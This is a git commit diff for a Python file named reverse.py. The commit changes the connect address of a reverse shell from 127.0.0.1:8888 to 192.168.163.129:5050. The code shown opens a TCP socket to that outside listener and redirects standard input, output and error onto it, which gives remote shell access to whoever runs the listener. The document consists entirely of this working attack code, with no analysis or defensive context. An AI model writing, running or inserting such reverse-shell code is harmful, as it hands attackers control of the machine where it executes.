524a950bdb342f63706e3138b4646e5f19a9f7b5
nayanbhile <61816260+nayanbhile@users.noreply.github.com>
2023-04-07 21:35:54 -0400

    Update reverse.py

--- reverse.py
+++ reverse.py
@@ -3,7 +3,7 @@ from os import dup2
 from subprocess import run
 import socket
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-s.connect(("127.0.0.1",8888)) 
+s.connect(("192.168.163.129",5050)) 
 dup2(s.fileno(),0) 
 dup2(s.fileno(),1) 
 dup2(s.fileno(),2) 
